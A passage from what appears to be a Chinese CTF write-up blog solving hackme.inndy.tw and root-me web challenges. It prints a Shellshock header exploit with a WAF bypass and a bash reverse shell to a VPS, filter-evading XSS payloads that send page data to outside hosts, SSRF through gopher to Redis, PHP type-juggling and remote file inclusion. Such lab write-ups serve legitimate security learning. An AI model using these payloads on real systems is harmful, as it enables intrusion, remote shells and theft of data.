plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://command-executor.hackme.inndy.tw/index.php?func=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p>base64解码一下得到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pages = [</span><br><span class="line">    [<span class="string">'man'</span>, <span class="string">'Man'</span>],</span><br><span class="line">    [<span class="string">'untar'</span>, <span class="string">'Tar Tester'</span>],</span><br><span class="line">    [<span class="string">'cmd'</span>, <span class="string">'Cmd Exec'</span>],</span><br><span class="line">    [<span class="string">'ls'</span>, <span class="string">'List files'</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fuck</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">    header(<span class="string">'Content-Type: text/plain'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    <span class="string">'\/flag'</span>, <span class="string">'\(\)\s*\&#123;\s*:;\s*\&#125;;'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $black_list;</span><br><span class="line">    <span class="keyword">if</span>(is_array($a)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($black_list <span class="keyword">as</span> $b) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/$b/"</span>, $a) === <span class="number">1</span>) &#123;</span><br><span class="line">                fuck(<span class="string">"$b detected! exit now."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cmd, $shell=<span class="string">'bash'</span>)</span> </span>&#123;</span><br><span class="line">    system(sprintf(<span class="string">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span>(substr($key, <span class="number">0</span>, <span class="number">5</span>) === <span class="string">'HTTP_'</span>) &#123;</span><br><span class="line">        putenv(<span class="string">"$key=$val"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func'</span>])) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'func'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($page, <span class="string">'..'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $page = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($page &amp;&amp; strlen($page) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"$page.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 <code>CVE-2014-6271(破壳（shellsock）漏洞)</code> ，在freebuf中有一个链接</p><blockquote><p><a href="http://www.freebuf.com/articles/system/45390.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/45390.html</a></p></blockquote><p>国外有一个漏洞利用的文章，</p><blockquote><p><a href="https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php" target="_blank" rel="noopener">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</a></p></blockquote><p><img src="/2018/08/28/hackme/4.png" alt="exp"></p><p>但是直接利用会被waf掉，所以我们要考虑绕过正则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br></pre></td></tr></table></figure><p>题目的正则中 <code>:;</code> 是存在漏洞的，我们可以用 <code>: ;</code> 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 <code>\/flag</code> 我们可以利用通配符绕过，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/cat ../../../?lag-reader.c&quot; -q -O -  &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure><p>但是并没有出现flag，发现是因为只有root才有文件的读权限</p><p><img src="/2018/08/28/hackme/5.png" alt=""></p><p>但是题目中有一个flag-reader文件，我们尝试读取一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/cat ../../../../../../?lag-reader.c&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">include &lt;unistd.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">4096</span>], rnd[<span class="number">16</span>], val[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class="keyword">sizeof</span>(rnd), <span class="number">0</span>) != <span class="keyword">sizeof</span>(rnd)) &#123;</span><br><span class="line">write(<span class="number">1</span>, <span class="string">"Not enough random\n"</span>, <span class="number">18</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setuid(<span class="number">1337</span>);</span><br><span class="line">seteuid(<span class="number">1337</span>);</span><br><span class="line">alarm(<span class="number">1</span>);</span><br><span class="line">write(<span class="number">1</span>, &amp;rnd, <span class="keyword">sizeof</span>(rnd));</span><br><span class="line">read(<span class="number">0</span>, &amp;val, <span class="keyword">sizeof</span>(val));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(rnd, val, <span class="keyword">sizeof</span>(rnd)) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> s = read(fd, buff, <span class="number">1024</span>);</span><br><span class="line"><span class="keyword">if</span>(s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">write(<span class="number">1</span>, buff, s);</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">write(<span class="number">1</span>, <span class="string">"Can not open file\n"</span>, <span class="number">18</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">write(<span class="number">1</span>, <span class="string">"Wrong response\n"</span>, <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/your_vps_ip/8888 0&gt;&amp;1&quot; -q -O -  &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure><p>又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/content &lt; /var/tmp/content</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat content</span><br></pre></td></tr></table></figure><h1 id="xssme"><a href="#xssme" class="headerlink" title="xssme"></a>xssme</h1><p>先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;123&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做</p><p><img src="/2018/08/28/hackme/7.png" alt="payload"></p><p>然后在自己的ceve账号中收到回显</p><p><img src="/2018/08/28/hackme/6.png" alt="回显"></p><h1 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a>xssrf leak</h1><p>上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显</p><blockquote><p>Admin only allowed from localhost, but you came from 192.168.123.1</p></blockquote><p>修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://ov0eg5.ceye.io/?&apos;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure><p>但是遭到了过滤，我们可以考虑用HTML实体编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#111;&amp;#118;&amp;#48;&amp;#101;&amp;#103;&amp;#53;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure><p>果然可以收到payload，base64解码一下再保存为html格式打开</p><p><img src="/2018/08/28/hackme/8.png" alt=""></p><p>send request功能有个request.php，尝试读取该页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>编码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#51;&amp;#56;&amp;#46;&amp;#54;&amp;#56;&amp;#46;&amp;#50;&amp;#57;&amp;#46;&amp;#57;&amp;#50;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#51;&amp;#47;&amp;#63;&amp;#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59;&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后在vps上即可收到base64字符串，解码</p><p><img src="/2018/08/28/hackme/9.png" alt=""></p><p>这应该就是题目的利用位置，我们尝试读config.php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>编码发送，果然可以收到flag</p><p><img src="/2018/08/28/hackme/10.png" alt="result"></p><h1 id="xssrf-redis"><a href="#xssrf-redis" class="headerlink" title="xssrf redis"></a>xssrf redis</h1><p>题目漏洞点在于gopher未授权访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure><p>发现有flag，读取之</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br></pre></td></tr></table></figure><p>然后处理一下即可得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址&lt;a href=&quot;https://hackme.inndy.tw/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://hackme.inndy.tw/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>rootme.webserver2</title>
    <link href="http://chaosec.top/2018/08/06/rootme1/"/>
    <id>http://chaosec.top/2018/08/06/rootme1/</id>
    <published>2018-08-06T03:47:10.000Z</published>
    <updated>2018-10-16T14:05:42.031Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>接上篇writeup</p><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="PHP-type-juggling"><a href="#PHP-type-juggling" class="headerlink" title="PHP type juggling"></a>PHP type juggling</h2><p>PHP弱类型比较，提示<strong>类型欺骗</strong> ，查看官方文档点击 <a href="http://php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">此处</a></p><p>题目代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $FLAG, $USER and $PASSWORD_SHA256 in secret file</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"secret.php"</span>);</span><br><span class="line"><span class="comment">// show my source code</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$return[<span class="string">'status'</span>] = <span class="string">'Authentication failed!'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"auth"</span>]))  &#123; </span><br><span class="line">    <span class="comment">// retrieve JSON data</span></span><br><span class="line">    $auth = @json_decode($_POST[<span class="string">'auth'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// check login and password (sha256)</span></span><br><span class="line">    <span class="keyword">if</span>($auth[<span class="string">'data'</span>][<span class="string">'login'</span>] == $USER &amp;&amp; !strcmp($auth[<span class="string">'data'</span>][<span class="string">'password'</span>], $PASSWORD_SHA256))&#123;</span><br><span class="line">        $return[<span class="string">'status'</span>] = <span class="string">"Access granted! The validation password is: $FLAG"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> json_encode($return);</span><br></pre></td></tr></table></figure><p>关键语句如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($auth[<span class="string">'data'</span>][<span class="string">'login'</span>] == $USER &amp;&amp; !strcmp($auth[<span class="string">'data'</span>][<span class="string">'password'</span>], $PASSWORD_SHA256))&#123;</span><br><span class="line">        $return[<span class="string">'status'</span>] = <span class="string">"Access granted! The validation password is: $FLAG"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一个比较可以利用字符串与布尔值比较的强制类型转换绕过，即是当一个字符串与布尔真比较时会判断相等成立，第二个比较可以利用数组绕过</p><p><img src="/2018/08/06/rootme1/1.png" alt="松散比较表"></p><p>PS：本题还需要注意json的赋值</p><p><img src="/2018/08/06/rootme1/2.png" alt="payload"></p><h2 id="Remote-File-Inclusion"><a href="#Remote-File-Inclusion" class="headerlink" title="Remote File Inclusion"></a>Remote File Inclusion</h2><p>相关博客介绍<a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">链接</a></p><p>在自己的vps上一个PHP文件，文件名要以<code>_lang.php</code> 结尾，例如 <code>456_lang.php</code>，写入如下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = file_get_contents(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> $con;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后提交请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch13/?lang=http://your_vps_ip/456</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：这里的PHP文件不能是可执行的PHP文件，换句话说应该使服务器将PHP文件当做文本而不执行其代码，可以考虑使用Nginx服务器（默认不支持PHP），这样的话代码就不会被执行，然后再提交。</p><h2 id="Server-side-Template-Injection"><a href="#Server-side-Template-Injection" class="headerlink" title="Server-side Template Injection"></a>Server-side Template Injection</h2><p>这道题目又让我学到了新东西，这题的知识点是服务器端模板注入（SSTI），成因在于一些模板引擎对于用户输入的内容过滤不严谨，导致一些输入被当做代码执行了，类似于XSS漏洞，具体可以 <a href="http://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/" target="_blank" rel="noopener">Click Here</a></p><hr><p>回到本题中，当我们提交内容之后</p><p><img src="/2018/08/06/rootme1/3.png" alt=""></p><p>我们输入的内容会在页面中显示，查看代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">checkNickname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">var serviceUrl = <span class="string">"check"</span>;</span><br><span class="line">var nick = $(<span class="string">"#nickname"</span>).val();</span><br><span class="line">var postData = <span class="string">"nickname="</span> + encodeURIComponent(nick);</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url : 